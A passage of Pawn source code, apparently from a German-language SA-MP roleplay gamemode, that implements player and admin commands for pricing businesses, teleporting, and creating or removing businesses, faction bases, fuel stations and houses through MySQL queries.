    if(strcmp(cmd, "/prodprice", true) == 0)
    {
        new bouse = PlayerInfo[playerid][pPbiskey];
        if (bouse == 255)
        {
            SCM(playerid, COLOR_GRAD2, "   Dir gehört kein Geschäft");
            return 1;
        }
        tmp = strtoknew(cmdtext, idx);
        if(!strlen(tmp))
        {
            SCM(playerid, COLOR_RED, "Verwendung /prodprice [kosten pro Produkt]");
        }
        if(strval(tmp) < 3 || strval(tmp) > 10)
        {
            SCM(playerid, COLOR_WHITE, "Minimum betrag lautet €3, Maximum betrag lautet €10.");
            return 1;
        }
        if (bouse >= 100)
        {
            if(strval(tmp) > SBizzInfo[bouse-100][sbTill])
            {
                SCM(playerid, COLOR_WHITE, "Du besitzt nicht das nötige KleinGeld.");
                return 1;
            }
            SBizzInfo[bouse-100][sbPriceProd] = strval(tmp);
  			format(string, sizeof(string), "Produkte für €%d kaufen.", SBizzInfo[bouse-100][sbPriceProd]);
  			OnPropUpdate_sb(bouse-100);
        }
        else
        {
	        if(strval(tmp) > BizzInfo[bouse][bTill])
	        {
	            SCM(playerid, COLOR_WHITE, "Du besitzt nicht das nötige KleinGeld.");
	            return 1;
	        }
	        BizzInfo[bouse][bPriceProd] = strval(tmp);
	        format(string, sizeof(string), "Produkte für €%d kaufen.", BizzInfo[bouse][bPriceProd]);
	        OnPropUpdate_b(bouse);
        }
        SCM(playerid, COLOR_WHITE, string);
        return 1;
    }
    if(strcmp(cmd, "/bizfee", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            new bouse = PlayerInfo[playerid][pPbiskey];
            if (bouse == 255)
            {
                SCM(playerid, COLOR_GRAD2, "   Dir gehört kein Geschäft !");
                return 1;
            }
            tmp = strtoknew(cmdtext, idx);
            if(!strlen(tmp))
            {
                SCM(playerid, COLOR_RED, "Verwendung /bizfee [EntrittsPreis]");
            }
            if(strval(tmp) < 0 || strval(tmp) > 2500)
            {
                SCM(playerid, COLOR_WHITE, "Minimaler eintritt ist $0, Maximaler eintritt ist $2500.");
                return 1;
            }
            if (bouse >= 100)
            {
                SBizzInfo[bouse-100][sbEntranceCost] = strval(tmp);
                format(string, sizeof(string), "Eintritts Preis wurde auf $%d gesetzt.", SBizzInfo[bouse-100][sbEntranceCost]);
                OnPropUpdate_sb(bouse-100);
            }
            else
            {
                BizzInfo[bouse][bEntranceCost] = strval(tmp);
                format(string, sizeof(string), "Eintritts Preis wurde auf $%d gesetzt.", BizzInfo[bouse][bEntranceCost]);
                OnPropUpdate_b(bouse);
            }
            SCM(playerid, COLOR_WHITE, string);
        }
        return 1;
    }
	if(strcmp(cmd, "/carget", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Benutze: /carget [carid]");
				return 1;
			}
			new Float:plocx,Float:plocy,Float:plocz;
			new plo;
			plo = strval(tmp);
			if (PlayerInfo[playerid][pAdmin] >= 3)
			{
				GetPlayerPos(playerid, plocx, plocy, plocz);
				SetVehiclePos(plo,plocx,plocy+4, plocz);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "  Du bist nicht befugt!");
			}
		}
		return 1;
	}
//-----------------------------------[Slap]-----------------------------------------------
	if(strcmp(cmd, "/aslap", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "NUTZUNG: /aslap [playerid]");
				return 1;
			}
			new playa;
			new Float:shealth;
			new Float:slx, Float:sly, Float:slz;
			playa = ReturnUser(tmp);
			if (PlayerInfo[playerid][pAdmin] > 1337)
			{
			    if(IsPlayerConnected(playa))
			    {
			        if(playa != INVALID_PLAYER_ID)
			        {
				        GetPlayerName(playa, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						GetPlayerHealth(playa, shealth);
						SetPlayerHealth(playa, shealth-5);
						GetPlayerPos(playa, slx, sly, slz);
						SetPlayerPos(playa, slx, sly, slz+5);
						PlayerPlaySound(playa, 1130, slx, sly, slz+5);
						printf("AdminSystem: %s slapped %s",sendername,  giveplayer);
						format(string, sizeof(string), "AdmCmd: %s hat %s geslappt.",sendername,giveplayer);
						ABroadCast(COLOR_LIGHTRED,string,1);
					}
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "   Das darfst du nicht tun!");
			}
		}
		return 1;
	}
	if(strcmp(cmd, "/house", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
		{
		    if(PlayerInfo[playerid][pAdmin] >= 1337)
		    {
				tmp = strtoknew(cmdtext, idx);
				if(!strlen(tmp))
				{
					SendClientMessage(playerid, COLOR_GRAD2, "Nutze: /house [hausnummer]");
					return 1;
				}
				new housenum = strval(tmp);
				SetPlayerInterior(playerid,HouseInfo[housenum][hInt]);
				SetPlayerPos(playerid,HouseInfo[housenum][hExitx],HouseInfo[housenum][hExity],HouseInfo[housenum][hExitz]);
				GameTextForPlayer(playerid, "~w~Teleporting", 5000, 1);
				PlayerInfo[playerid][pInt] = HouseInfo[housenum][hInt];
				PlayerInfo[playerid][pLocal] = housenum;
			}
		}
		return 1;
	}
	if(strcmp(cmd, "/biz", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
		{
		    if(PlayerInfo[playerid][pAdmin] >= 1337)
		    {
				tmp = strtoknew(cmdtext, idx);
				if(!strlen(tmp))
				{
					SendClientMessage(playerid, COLOR_GRAD2, "NUTZE: /biz [biznummer]");
					return 1;
				}
				new housenum = strval(tmp);
				SetPlayerInterior(playerid,BizzInfo[housenum][bInterior]);
				SetPlayerPos(playerid,BizzInfo[housenum][bExitX],BizzInfo[housenum][bExitY],BizzInfo[housenum][bExitZ]);
				GameTextForPlayer(playerid, "~w~Teleporting", 5000, 1);
				PlayerInfo[playerid][pInt] = BizzInfo[housenum][bInterior];
				PlayerInfo[playerid][pLocal] = housenum+99;
			}
		}
		return 1;
	}
	if(strcmp(cmd, "/sbiz", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
		{
		    if(PlayerInfo[playerid][pAdmin] >= 1337)
		    {
				tmp = strtoknew(cmdtext, idx);
				if(!strlen(tmp))
				{
					SendClientMessage(playerid, COLOR_GRAD2, "NUTZE: /sbiz [biznummer]");
					return 1;
				}
				new housenum = strval(tmp);
				SetPlayerInterior(playerid,SBizzInfo[housenum][sbInterior]);
				SetPlayerPos(playerid,SBizzInfo[housenum][sbEntranceX],SBizzInfo[housenum][sbEntranceY],SBizzInfo[housenum][sbEntranceZ]);
				GameTextForPlayer(playerid, "~w~Teleporting", 5000, 1);
			}
		}
		return 1;
	}
/*

	if(strcmp(cmd, "/createshop", true) == 0)
	{
        if (PlayerInfo[playerid][pAdmin] >= 2002)
        {

			    new x_job = FreesBizzCheck();

				if(x_job >= 0 && x_job <= 80)
				{

				    new query[128],str1[248];
					format(query,sizeof(query),"INSERT INTO sbizz (id) VALUES ('%i')",x_job);
					mysql_function_query(mysqlcon,query, false, "", "");
			   		mysql_free_result();

					SBizzInfo[x_job][sbCreated] = 1;


				    GetPlayerPos(playerid,SBizzInfo[x_job][sbEntranceX],SBizzInfo[x_job][sbEntranceY],SBizzInfo[x_job][sbEntranceZ]);



//					SBizzInfo[x_job][sbExitX] = 286.148986;
//					SBizzInfo[x_job][sbExitY] = -40.644397;
//					SBizzInfo[x_job][sbExitZ] = 1001.515625;
//					SBizzInfo[x_job][sbExitR] = 0;



					SBizzInfo[x_job][sbDate] = 1;



					strmid(SBizzInfo[x_job][sbOwner], "Der Staat", 0, strlen("Der Staat"), 255);
					strmid(SBizzInfo[x_job][sbExtortion], "Niemand", 0, strlen("Niemand"), 255);

					strmid(SBizzInfo[x_job][sbMessage], "Neues sBizz", 0, strlen("Neues sBizz"), 255);

					SBizzInfo[x_job][sbOwned] = 0;

					SBizzInfo[x_job][sbEntranceCost] = 75;
					SBizzInfo[x_job][sbTill] = 1;
					SBizzInfo[x_job][sbLocked] = 0;
					SBizzInfo[x_job][sbInterior] = 1;
					SBizzInfo[x_job][sbProducts] = 500;
					SBizzInfo[x_job][sbMaxProducts] = 55;
					SBizzInfo[x_job][sbPriceProd] = 1;


					SBizzInfo[x_job][sbLevelNeeded] = 15;

					SBizzInfo[x_job][sbBuyPrice] = 1500000;

					SBizzInfo[x_job][sbPickup] = CreatePickup(1239, 1, SBizzInfo[x_job][sbEntranceX], SBizzInfo[x_job][sbEntranceY], SBizzInfo[x_job][sbEntranceZ]);



					format(string, sizeof(string), "==== [sBizz ID: %d] ====\nName: %s\nBesitzer: %s\nPreis: %d$\nEintritt: %d$\nProdukte: %d / %d",idx,SBizzInfo[x_job][sbMessage],SBizzInfo[x_job][sbOwner],SBizzInfo[x_job][sbBuyPrice],SBizzInfo[x_job][sbEntranceCost],SBizzInfo[x_job][sbProducts],SBizzInfo[x_job][sbMaxProducts]);
					SBizzInfo[x_job][sB_text] = Create3DTextLabel(string,0x0091FFFF,SBizzInfo[x_job][sbEntranceX], SBizzInfo[x_job][sbEntranceY], SBizzInfo[x_job][sbEntranceZ],18.0,0,0);



					OnPropUpdate_sb(x_job);
					SendClientMessage(playerid,COLOR_RED,"[SERVER]: sBizz erstellt.");


					PlayerInfo[playerid][pCreateBiz] = x_job;


//					ShowPlayerDialog(playerid, DIALOG_BIZ_ERSTELLEN, DIALOG_STYLE_LIST, "Bizz Erstellen", "Ammunation Interior 1\nAmmunation Interior 2\nAmmunation Interior 3\nAmmunation Interior 4\nAmmunation Interior 5", "Auswählen", "Abbrechen");


					return 1;
				}
    	}
	}

	if(strcmp(cmd, "/removeshop", true) == 0)
	{
        if (PlayerInfo[playerid][pAdmin] >= 2002)
        {

	    new query[150];
  		tmp = strtoknew(cmdtext, idx);
        if(!strlen(tmp))
        {
        	SendClientMessage(playerid, COLOR_RED, "FEHLER: /removeshop [Shop ID]");
            return 1;
		}
        new x_job = strval(tmp);
		if(SBizzInfo[x_job][sbCreated] == 0) {
		    SendClientMessage(playerid,COLOR_RED,"[SERVER]: Shop ID nicht erstellt.");
		    return 1;
		} else {
		    SBizzInfo[x_job][sbCreated] = 0;


			SBizzInfo[x_job][sbEntranceX] = 0;
			SBizzInfo[x_job][sbEntranceY] = 0;
			SBizzInfo[x_job][sbEntranceZ] = 0;


			format(query,sizeof(query),"UPDATE accounts SET pbiskey = '255' WHERE name = '%s'",SBizzInfo[x_job][sbOwner]);
			mysql_function_query(mysqlcon,query, false, "", "");


			Delete3DTextLabel(SBizzInfo[x_job][sB_text]);
			DestroyPickup(SBizzInfo[x_job][sbPickup]);
			OnPropUpdate_sb(x_job);
			SendClientMessage(playerid,COLOR_RED,"[SERVER]: Bizz entfernt.");
        	}
		}
		return 1;
	}
*/














	if(strcmp(cmd, "/removefrak", true) == 0)
	{
        if (PlayerInfo[playerid][pAdmin] >= 2002)
        {
  		tmp = strtoknew(cmdtext, idx);
        if(!strlen(tmp))
        {
        	SendClientMessage(playerid, COLOR_RED, "FEHLER: /removefrak [Biz ID]");
            return 1;
		}
        new x_job = strval(tmp);



		if(FrakInfo[x_job][fCreated] == 0)
		{
		    SendClientMessage(playerid,COLOR_RED,"[SERVER]: Frak ID nicht erstellt.");
		    return 1;
		}


		if(x_job == 0)
		{
		    SendClientMessage(playerid,COLOR_RED,"Diese Fraktion kann nicht entfernt werden");
		    return 1;
		}



		else
		{

		    FrakInfo[x_job][fCreated] = 0;


			FrakInfo[x_job][fEntranceX] = 0;
			FrakInfo[x_job][fEntranceY] = 0;
			FrakInfo[x_job][fEntranceZ] = 0;


			Delete3DTextLabel(FrakInfo[x_job][f_text]);
			DestroyPickup(FrakInfo[x_job][fPickup]);
			OnPropUpdate_f(x_job);
			SendClientMessage(playerid,COLOR_RED,"[SERVER]: Frak entfernt.");
        	}
		}
		return 1;
	}


	if(strcmp(cmd, "/frakend", true) == 0)
	{
		if(IsPlayerAdmin(playerid))
	  	{
	        if (PlayerInfo[playerid][pTemp] > 0)
	        {
				    new Float:x, Float:y, Float:z;
				    GetPlayerPos(playerid, x, y, z);
					FrakInfo[PlayerInfo[playerid][pTemp]][fExitX] = x;
					FrakInfo[PlayerInfo[playerid][pTemp]][fExitY] = y;
					FrakInfo[PlayerInfo[playerid][pTemp]][fExitZ] = z;
					FrakInfo[PlayerInfo[playerid][pTemp]][fCreated] = 1;
					FrakInfo[PlayerInfo[playerid][pTemp]][fInterior] = GetPlayerInterior(playerid);









				            format(frakbasetring, sizeof(frakbasetring), "Fraktionsbase %d\n\n%s",PlayerInfo[playerid][pTemp],FrakInfo[PlayerInfo[playerid][pTemp]][fMessage]);
							FrakInfo[PlayerInfo[playerid][pTemp]][f_text] = Create3DTextLabel(frakbasetring,0xFFFFFFAA,FrakInfo[PlayerInfo[playerid][pTemp]][fEntranceX], FrakInfo[PlayerInfo[playerid][pTemp]][fEntranceY], FrakInfo[PlayerInfo[playerid][pTemp]][fEntranceZ]+1.25,15,0,1);
				   			Update3DTextLabelText(FrakInfo[PlayerInfo[playerid][pTemp]][f_text],0xFFFFFFAA,frakbasetring);
							FrakInfo[PlayerInfo[playerid][pTemp]][fPickup]	= CreatePickup(1318, 0, FrakInfo[PlayerInfo[playerid][pTemp]][fEntranceX], FrakInfo[PlayerInfo[playerid][pTemp]][fEntranceY], FrakInfo[PlayerInfo[playerid][pTemp]][fEntranceZ]+0.25);
							pickups++;






					OnPropUpdate_f(PlayerInfo[playerid][pTemp]);
					SendClientMessage(playerid,COLOR_LIGHTBLUE,"* Du hast die Fraktionsbase erfolgreich erstellt!");
			}
		}
		return 1;
	}


	if(strcmp(cmd, "/createfrak", true) == 0)
	{
		if(IsPlayerAdmin(playerid))
	  	{

			    new x_job = FreeFrakCheck();

				if(x_job >= 0 && x_job <= 80)
				{

/*
					for(new idxf=0; idxf<MAX_FRAKS; idxf++)
					{
						if(FrakInfo[idxf][fFrak] == x_job)
						{
							SendClientMessage(playerid,COLOR_GREY,"Es gibt diese Fraktion bereits! verwende /removefrak");
							return 1;
						}
					}
*/
				    new query[128];//str1[248]
					format(query,sizeof(query),"INSERT INTO frakbase (id) VALUES ('%i')",x_job);
				//	mysql_function_query(mysqlcon,query, false, "", "");
				    mysql_pquery(mysqlcon,query,"");
			   	//	mysql_free_result(); // MAL rausgenommen ^^




				    GetPlayerPos(playerid,FrakInfo[x_job][fEntranceX],FrakInfo[x_job][fEntranceY],FrakInfo[x_job][fEntranceZ]);


					FrakInfo[x_job][fExitX] = 286.148986;
					FrakInfo[x_job][fExitY] = -40.644397;
					FrakInfo[x_job][fExitZ] = 1001.515625;


					strmid(FrakInfo[x_job][fMessage], "Neue Frak", 0, strlen("Neue Frak"), 255);


					FrakInfo[x_job][fInterior] = 1;



//					FrakInfo[x_job][fPickup] = CreatePickup(1239, 1, FrakInfo[x_job][fEntranceX], FrakInfo[x_job][fEntranceY], FrakInfo[x_job][fEntranceZ]);



//					format(string, sizeof(string), "==== [Bizz ID: %d] ====\nName: %s\nBesitzer: %s\nErpresser: %s\nPreis: %d$\nEintritt: %d$\nProdukte: %d / %d",idx,BizzInfo[idx][bMessage],BizzInfo[idx][bOwner],BizzInfo[idx][bExtortion],BizzInfo[idx][bBuyPrice],BizzInfo[idx][bEntranceCost],BizzInfo[idx][bProducts],BizzInfo[idx][bMaxProducts]);
//					BizzInfo[x_job][B_text] = Create3DTextLabel(string,0x0091FFFF,BizzInfo[x_job][bEntranceX], BizzInfo[x_job][bEntranceY], BizzInfo[x_job][bEntranceZ],18.0,0,0);




					OnPropUpdate_f(x_job);
					PlayerInfo[playerid][pTemp] = x_job;
					ShowPlayerDialog(playerid,DIALOG_FRAKID, DIALOG_STYLE_INPUT, "Fraktion", "Welche Fraktion ID soll diese Base gehören ?:", "Akzeptieren", "Abbrechen");

					return 1;
				}
    	}
	}









	if(strcmp(cmd, "/createbiz", true) == 0)
	{
	        if (PlayerInfo[playerid][pAdmin] > 2001)
	        {
			    new x_job = FreeBizzCheck();

				if(x_job >= 0 && x_job <= 80)
				{

				    new query[128];//str1[248]
					format(query,sizeof(query),"INSERT INTO bizz (id) VALUES ('%i')",x_job);
				//	mysql_function_query(mysqlcon,query, false, "", "");
				    mysql_pquery(mysqlcon,query,"");
			   	//	mysql_free_result();

					BizzInfo[x_job][bCreated] = 1;


				    GetPlayerPos(playerid,BizzInfo[x_job][bEntranceX],BizzInfo[x_job][bEntranceY],BizzInfo[x_job][bEntranceZ]);

//					BizzInfo[x_job][bRobMarker] = 0;

					BizzInfo[x_job][bExitX] = 286.148986;
					BizzInfo[x_job][bExitY] = -40.644397;
					BizzInfo[x_job][bExitZ] = 1001.515625;
					BizzInfo[x_job][bExitR] = 0;

					BizzInfo[x_job][bTyp] = 1;

					BizzInfo[x_job][bDate] = 1;



					strmid(BizzInfo[x_job][bOwner], "Der Staat", 0, strlen("Der Staat"), 255);
					strmid(BizzInfo[x_job][bExtortion], "Niemand", 0, strlen("Niemand"), 255);

					strmid(BizzInfo[x_job][bMessage], "Neues Bizz", 0, strlen("Neues Bizz"), 255);

					BizzInfo[x_job][bOwned] = 0;

					BizzInfo[x_job][bEntranceCost] = 75;
					BizzInfo[x_job][bTill] = 1;
					BizzInfo[x_job][bLocked] = 0;
					BizzInfo[x_job][bInterior] = 1;
					BizzInfo[x_job][bProducts] = 500;
					BizzInfo[x_job][bMaxProducts] = 55;
					BizzInfo[x_job][bPriceProd] = 1;


					BizzInfo[x_job][bLevelNeeded] = 15;

					BizzInfo[x_job][bBuyPrice] = 1500000;

					BizzInfo[x_job][bPickup] = CreatePickup(1239, 1, BizzInfo[x_job][bEntranceX], BizzInfo[x_job][bEntranceY], BizzInfo[x_job][bEntranceZ]);



					format(string, sizeof(string), "==== [Bizz ID: %d] ====\nName: %s\nBesitzer: %s\nErpresser: %s\nPreis: %d$\nEintritt: %d$\nProdukte: %d / %d",idx,BizzInfo[idx][bMessage],BizzInfo[idx][bOwner],BizzInfo[idx][bExtortion],BizzInfo[idx][bBuyPrice],BizzInfo[idx][bEntranceCost],BizzInfo[idx][bProducts],BizzInfo[idx][bMaxProducts]);
					BizzInfo[x_job][B_text] = Create3DTextLabel(string,0x0091FFFF,BizzInfo[x_job][bEntranceX], BizzInfo[x_job][bEntranceY], BizzInfo[x_job][bEntranceZ],18.0,0,0);




					OnPropUpdate_b(x_job);
					SendClientMessage(playerid,COLOR_RED,"[SERVER]: Bizz erstellt.");


					PlayerInfo[playerid][pCreateBiz] = x_job;


					ShowPlayerDialog(playerid, DIALOG_BIZ_ERSTELLEN, DIALOG_STYLE_LIST, "Bizz Erstellen", "Ammunation Interior 1\nAmmunation Interior 2\nAmmunation Interior 3\nAmmunation Interior 4\nAmmunation Interior 5\nClucking Bell\nBurger Short\n24/7\nWell Stacked Pizza Co\nLil' probe inn\nBar\nClub\nsBizz (Nur für Scripter)", "Auswählen", "Abbrechen");


					return 1;
				}
    	}
	}

	if(strcmp(cmd, "/removebiz", true) == 0)
	{
        if (PlayerInfo[playerid][pAdmin] >= 2002)
        {

	    new query[150];
  		tmp = strtoknew(cmdtext, idx);
        if(!strlen(tmp))
        {
        	SendClientMessage(playerid, COLOR_RED, "FEHLER: /removebiz [Biz ID]");
            return 1;
		}
        new x_job = strval(tmp);



		if(BizzInfo[x_job][bCreated] == 0)
		{
		    SendClientMessage(playerid,COLOR_RED,"[SERVER]: Bizz ID nicht erstellt.");
		    return 1;
		}
		if(BizzInfo[x_job][bTyp] == 9)
		{
		    SendClientMessage(playerid,COLOR_GREY,"Dieses Biz kann ingame nicht entfernt werden.");
		    return 1;
		}

		else
		{

		    BizzInfo[x_job][bCreated] = 0;


			BizzInfo[x_job][bEntranceX] = 0;
			BizzInfo[x_job][bEntranceY] = 0;
			BizzInfo[x_job][bEntranceZ] = 0;


			format(query,sizeof(query),"UPDATE accounts SET pbiskey = '255' WHERE name = '%s'",BizzInfo[x_job][bOwner]);
		//	mysql_function_query(mysqlcon,query, false, "", "");
		    mysql_pquery(mysqlcon,query,"");


			Delete3DTextLabel(BizzInfo[x_job][B_text]);
			DestroyPickup(BizzInfo[x_job][bPickup]);
			OnPropUpdate_b(x_job);
			SendClientMessage(playerid,COLOR_RED,"[SERVER]: Bizz entfernt.");
        	}
		}
		return 1;
	}

	if(strcmp(cmd, "/createtanke", true) == 0)
	{
        if (PlayerInfo[playerid][pAdmin] >= 2002)
        {

			    new x_job = FreeTankeCheck();

				if(x_job >= 0 && x_job <= 80)
				{

				    new query[128],str1[248];
					format(query,sizeof(query),"INSERT INTO fuelstation (id) VALUES ('%i')",x_job);
				//	mysql_function_query(mysqlcon,query, false, "", "");
				    mysql_pquery(mysqlcon,query,"");
			   	//	mysql_free_result();

					TankeInfo[x_job][tCreated] = 1;


				    GetPlayerPos(playerid,TankeInfo[x_job][tEntranceX],TankeInfo[x_job][tEntranceY],TankeInfo[x_job][tEntranceZ]);


					strmid(TankeInfo[x_job][tOwner], "Der Staat", 0, strlen("Der Staat"), 255);
					strmid(TankeInfo[x_job][tExtortion], "Niemand", 0, strlen("Niemand"), 255);

					strmid(TankeInfo[x_job][tMessage], "Neue Tankstelle", 0, strlen("Neue Tankstelle"), 255);

					TankeInfo[x_job][tOwned] = 0;

					TankeInfo[x_job][tEntranceCost] = 75;
					TankeInfo[x_job][tTill] = 1;
					TankeInfo[x_job][tLocked] = 0;
					TankeInfo[x_job][tInterior] = 0;
					TankeInfo[x_job][tProducts] = 500;
					TankeInfo[x_job][tMaxProducts] = 55;
					TankeInfo[x_job][tPriceProd] = 1;


					TankeInfo[x_job][tLevelNeeded] = 15;

					TankeInfo[x_job][tBuyPrice] = 1500000;

					TankeInfo[x_job][tPickup] = CreatePickup(1650, 1, TankeInfo[x_job][tEntranceX], TankeInfo[x_job][tEntranceY], TankeInfo[x_job][tEntranceZ]);

		            format(str1, sizeof(str1), "%s\n Diese Tankstelle steht zum Verkauf!\nPreis: $%d \nLevel: %d \nBenutze /buytanke um die Tankstelle zu kaufen",TankeInfo[x_job][tMessage],TankeInfo[x_job][tBuyPrice],TankeInfo[x_job][tLevelNeeded]);
					TankeInfo[x_job][t_text] = Create3DTextLabel(str1,0xFFFFFFAA,TankeInfo[x_job][tEntranceX], TankeInfo[x_job][tEntranceY], TankeInfo[x_job][tEntranceZ]+1.25,15,0,1);

					printf("%d 1", x_job);

					OnPropUpdate_t(x_job);
					SendClientMessage(playerid,COLOR_RED,"[SERVER]: Tankstelle erstellt.");
					return 1;
				}
    	}
	}

	if(strcmp(cmd, "/removetanke", true) == 0)
	{
        if (PlayerInfo[playerid][pAdmin] >= 2002)
        {

	    new query[150];
  		tmp = strtoknew(cmdtext, idx);
        if(!strlen(tmp))
        {
        	SendClientMessage(playerid, COLOR_RED, "FEHLER: /removetanke [Tankstellen ID]");
            return 1;
		}
        new x_job = strval(tmp);
		if(TankeInfo[x_job][tCreated] == 0) {
		    SendClientMessage(playerid,COLOR_RED,"[SERVER]: Tankstellen ID nicht erstellt.");
		    return 1;
		} else {
		    TankeInfo[x_job][tCreated] = 0;


			TankeInfo[x_job][tEntranceX] = 0;
			TankeInfo[x_job][tEntranceY] = 0;
			TankeInfo[x_job][tEntranceZ] = 0;


			format(query,sizeof(query),"UPDATE accounts SET ptankekey = '255' WHERE name = '%s'",TankeInfo[x_job][tOwner]);
		//	mysql_function_query(mysqlcon,query, false, "", "");
		    mysql_pquery(mysqlcon,query,"");


			Delete3DTextLabel(TankeInfo[x_job][t_text]);
			DestroyPickup(TankeInfo[x_job][tPickup]);
			OnPropUpdate_t(x_job);
			SendClientMessage(playerid,COLOR_RED,"[SERVER]: Tankstelle entfernt.");
        	}
		}
		return 1;
	}
	if(strcmp(cmd, "/createhouse", true) == 0)
	{
        if (PlayerInfo[playerid][pAdmin] >= 2002)
        {

			    new x_job = FreeHouseCheck();

				if(x_job >= 0 && x_job <= 998)
				{
					if(HouseInfo[x_job][hCreated] == 1)
					{
						SendClientMessage(playerid,COLOR_RED,"[SERVER]: Die Haus ID gibt es bereits!.");
						return 1;
					}
				    new Float:getx,Float:gety,Float:getz, str1[128];
				    GetPlayerPos(playerid,getx,gety,getz);
					printf("/createhouse Command: %d.",x_job);  //-> The number is 42.
				    new query[128];
					format(query,sizeof(query),"INSERT INTO houses (houseid) VALUES ('%i')",x_job);
				//	mysql_function_query(mysqlcon,query, false, "", "");
				    mysql_pquery(mysqlcon,query,"");

			   	//	mysql_free_result();
					HouseInfo[x_job][hCreated] = 1;
					HouseInfo[x_job][hEntrancex] = getx; HouseInfo[x_job][hEntrancey] = gety; HouseInfo[x_job][hEntrancez] = getz;
					HouseInfo[x_job][hExitx] = 244.5000;
					HouseInfo[x_job][hExity] = 305.0000;
					HouseInfo[x_job][hExitz] = 999.1484;
					HouseInfo[x_job][hValue] = 250000;
					HouseInfo[x_job][hLock] = 1;
					HouseInfo[x_job][hInt] = 1;
					HouseInfo[x_job][hArm] = 0;
					HouseInfo[x_job][hHel] = 0;
					HouseInfo[x_job][hRent] = 50;
					HouseInfo[x_job][hRentabil] = 0;
					HouseInfo[x_job][hLevel] = 3;
//					HouseInfo[x_job][hMuell] = 0;
					HouseInfo[x_job][hPickup] = CreatePickup(1273, 1, HouseInfo[x_job][hEntrancex], HouseInfo[x_job][hEntrancey], HouseInfo[x_job][hEntrancez]);
					strmid(HouseInfo[x_job][hOwner], "Zu Verkaufen", 0, strlen("Zu Verkaufen"), 255);
					format(str1, sizeof(str1), "==== [HausID: %d] ====\nBesitzer: %s\nPreis: %d$\nMiete: %d$\n/buyhouse zum kaufen",x_job,HouseInfo[x_job][hOwner],HouseInfo[x_job][hValue],HouseInfo[x_job][hRent]);
					HouseInfo[x_job][h_text] = Create3DTextLabel(str1,COLOR_YELLOW,HouseInfo[x_job][hEntrancex], HouseInfo[x_job][hEntrancey], HouseInfo[x_job][hEntrancez],18.0,0,0);
					SaveProperty(x_job);
					SendClientMessage(playerid,COLOR_RED,"[SERVER]: Haus erstellt.");
					return 1;
				}
    	}
	}
	if(strcmp(cmd, "/removehouse", true) == 0) // owner wird nur gekickt
	{
        if (PlayerInfo[playerid][pAdmin] >= 2002)
        {

	    new query[150];
  		tmp = strtoknew(cmdtext, idx);
        if(!strlen(tmp))
        {
        	SendClientMessage(playerid, COLOR_RED, "FEHLER: /removehouse [HausID]");
            return 1;
		}
        new x_job = strval(tmp);
		if(HouseInfo[x_job][hCreated] == 0) {
		    SendClientMessage(playerid,COLOR_RED,"[SERVER]: HausID nicht erstellt.");
		    return 1;
		} else {
		    HouseInfo[x_job][hCreated] = 0;
	        HouseInfo[x_job][hEntrancex] = 0.0000; HouseInfo[x_job][hEntrancey] = 0.0000; HouseInfo[x_job][hEntrancez] = 0.0000;
	        HouseInfo[x_job][hExitx] = 0.0000;
			HouseInfo[x_job][hExity] = 0.0000;
			HouseInfo[x_job][hExitz] = 0.0000;
			HouseInfo[x_job][hValue] = 0;
			HouseInfo[x_job][hLock] = 1;
			HouseInfo[x_job][hInt] = 0;
			HouseInfo[x_job][hArm] = 0;
			HouseInfo[x_job][hHel] = 0;
			HouseInfo[x_job][hRent] = 0;
			HouseInfo[x_job][hRentabil] = 0;
			HouseInfo[x_job][hLevel] = 0;
//			HouseInfo[x_job][hMuell] = 0;
			format(query,sizeof(query),"UPDATE accounts SET phousekey = '999' WHERE name = '%s'",HouseInfo[x_job][hOwner]);
		//	mysql_function_query(mysqlcon,query, false, "", "");

			mysql_pquery(mysqlcon,query,"");

			//mysql_query(query);
            strmid(HouseInfo[x_job][hOwner], "Nicht Erstellt", 0, strlen("Nicht Erstellt"), 255);
			Delete3DTextLabel(HouseInfo[x_job][h_text]);
			DestroyPickup(HouseInfo[x_job][hPickup]);
			SaveProperty(x_job);
			SendClientMessage(playerid,COLOR_RED,"[SERVER]: Hausbesitzer entfernt.");
        	}
		}
		return 1;
	}
    if(strcmp(cmd, "/removehousedelete", true) == 0) // owner wird nur gekickt
	{
        if (PlayerInfo[playerid][pAdmin] >= 2002)
        {

	    new query[150];
  		tmp = strtoknew(cmdtext, idx);
        if(!strlen(tmp))
        {
        	SendClientMessage(playerid, COLOR_RED, "FEHLER: /removehouse [HausID]");
            return 1;
		}
        new x_job = strval(tmp);
		if(HouseInfo[x_job][hCreated] == 0) {
		    SendClientMessage(playerid,COLOR_RED,"[SERVER]: HausID nicht erstellt.");
		    return 1;
		} else {
		    HouseInfo[x_job][hCreated] = 0;
	        HouseInfo[x_job][hEntrancex] = 0.0000; HouseInfo[x_job][hEntrancey] = 0.0000; HouseInfo[x_job][hEntrancez] = 0.0000;
	        HouseInfo[x_job][hExitx] = 0.0000;
			HouseInfo[x_job][hExity] = 0.0000;
			HouseInfo[x_job][hExitz] = 0.0000;
			HouseInfo[x_job][hValue] = 0;
			HouseInfo[x_job][hLock] = 1;
			HouseInfo[x_job][hInt] = 0;
			HouseInfo[x_job][hArm] = 0;
			HouseInfo[x_job][hHel] = 0;
			HouseInfo[x_job][hRent] = 0;
			HouseInfo[x_job][hRentabil] = 0;
			HouseInfo[x_job][hLevel] = 0;
//			HouseInfo[x_job][hMuell] = 0;
			format(query,sizeof(query),"DELETE FROM `houses` WHERE `houses`.`hID` = %d",x_job);
			//mysql_function_query(mysqlcon,query, false, "", "");
			mysql_pquery(mysqlcon,query,"");

			//mysql_query(query);
            strmid(HouseInfo[x_job][hOwner], "Nicht Erstellt", 0, strlen("Nicht Erstellt"), 255);
			Delete3DTextLabel(HouseInfo[x_job][h_text]);
			DestroyPickup(HouseInfo[x_job][hPickup]);
			SaveProperty(x_job);
			SendClientMessage(playerid,COLOR_RED,"[SERVER]: Haus entfernt GELÖSCHT .");
        	}
		}
		return 1;
	}
